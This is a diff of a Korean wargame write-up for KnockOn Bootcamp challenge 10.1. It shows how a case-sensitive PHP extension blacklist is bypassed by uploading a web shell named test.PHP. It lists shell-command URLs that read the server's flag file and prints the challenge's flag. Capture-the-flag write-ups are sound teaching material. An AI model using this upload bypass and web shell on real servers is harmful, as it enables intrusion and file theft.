@@ -1,53 +1,33 @@
 ---
-title: "[Writeup] Knockon Bootcamp 2nd - 10.1 Can't access!"
+title: "KnockOn Bootcamp 2nd - 10.1 Can't Access! - Extension Bypass"
 categories:
   - Web Hacking
 tags:
   - Wargame
-  - Knockon Bootcamp 2nd
+  - KnockOn Bootcamp 2nd
   - File Upload
-  - Command Injection
-last_modified_at: 2024-09-15T21:30:00-05:00
+  - Filter Bypass
+  - Web Shell
+last_modified_at: 2024-09-16T11:30:00+09:00
 published: true
 ---
-
-|
-
 ## 문제
 
 <http://war.knock-on.org:10018/>
 
-![10.1 Can't access! 1](/assets/images/writeup/web-hacking/knock-on/10-1_FILE_1.png)
+![10.1 Can't access! 1](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-10-1-file-1.png)
 
-![10.1 Can't access! 2](/assets/images/writeup/web-hacking/knock-on/10-1_FILE_2.png)
-
-|
-
-|
-
-|
+![10.1 Can't access! 2](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-10-1-file-2.png)
 
 ### 목표
 
----
-
 서버 파일에서 flag 찾기
-
-|
 
 ### 공격 기법
 
----
-
 File Upload
-
-Command Injection
-
-|
-
-|
-
-|
+- Filter Bypass
+- Web Shell
 
 ## 문제 코드
 
@@ -228,17 +208,9 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST' && $_POST['title'] && $_POST['content']
 ?>
 ```
 
-|
-
-|
-
-|
-
 ## 코드 분석
 
 ### upload.php
-
----
 
 ```php
 $blacklist = array("php","php5","php4","php3","php2","php1","html","htm","phtml","pht","pHp","pHp5","pHp4","pHp3","pHp2","pHp1","Html","Htm","pHtml","jsp","jspa","jspx","jsw","jsv","jspf","jtml","jSp","jSpx","jSpa","jSw","jSv","jSpf","jHtml","asp","aspx","asa","asax","ascx","ashx","asmx","cer","aSp","aSpx","aSa","aSax","aScx","aShx","aSmx","cEr","sWf","swf");
@@ -246,24 +218,16 @@ $blacklist = array("php","php5","php4","php3","php2","php1","html","htm","phtml"
 
 파일 확장자에 대한 블랙리스트
 
-|
-
 ```php
 $fileExtension = pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION);
 ```
 `pathinfo()`:
 
-1. 파일 확장자에 대해 필터링 없이 그대로 사용함. 확장자를 대문자로 써도 대문자 그대로 블랙리스트와 대조함.
+1. 파일 확장자에 대해 필터링 없이 그대로 사용함. 확장자를 대문자로 써도 대문자 그대로 블랙리스트와 대조함
 
 2. 마지막 확장자만 추출함. 만약 파일 확장자가 `test.php.jpg`라고 되어 있으면 `.jpg`만 추출하여 블랙리스트와 대조함
 
-|
-
-|
-
-|
-
-## Exploit
+## 풀이
 
 ```php
 <?php
@@ -273,45 +237,31 @@ $fileExtension = pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION);
 
 `*.PHP` (대문자) 파일 업로드
 
-|
-
 ```sh
 http://war.knock-on.org:10018/uploads/test.PHP?cmd=ls
 ```
 
-![10.1 Can't access! 3](/assets/images/writeup/web-hacking/knock-on/10-1_FILE_3.png)
+![10.1 Can't access! 3](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-10-1-file-3.png)
 
 커맨드 실행 가능
-
-|
 
 ```sh
 http://war.knock-on.org:10018/uploads/test.PHP?cmd=ls%20../../../../
 ```
 
-![10.1 Can't access! 4](/assets/images/writeup/web-hacking/knock-on/10-1_FILE_4.png)
+![10.1 Can't access! 4](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-10-1-file-4.png)
 
 flag 발견
-
-|
 
 ```sh
 http://war.knock-on.org:10018/uploads/test.PHP?cmd=cat%20../../../../flag
 ```
 
-![10.1 Can't access! 5](/assets/images/writeup/web-hacking/knock-on/10-1_FILE_5.png)
+![10.1 Can't access! 5](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-10-1-file-5.png)
 
-|
-
-|
-
-|
-
-## Payload
+## 페이로드
 
 ### test.PHP
-
----
 
 ```php
 <?php
@@ -319,28 +269,14 @@ http://war.knock-on.org:10018/uploads/test.PHP?cmd=cat%20../../../../flag
 ?>
 ```
 
-|
-
 ### URL
-
----
 
 ```sh
 http://war.knock-on.org:10018/uploads/test.PHP?cmd=cat%20../../../../flag
 ```
 
-|
-
-|
-
 ### FLAG
-
----
 
 ```sh
 K0{you_upload_strange_file..}
 ```
-
-|
-
----
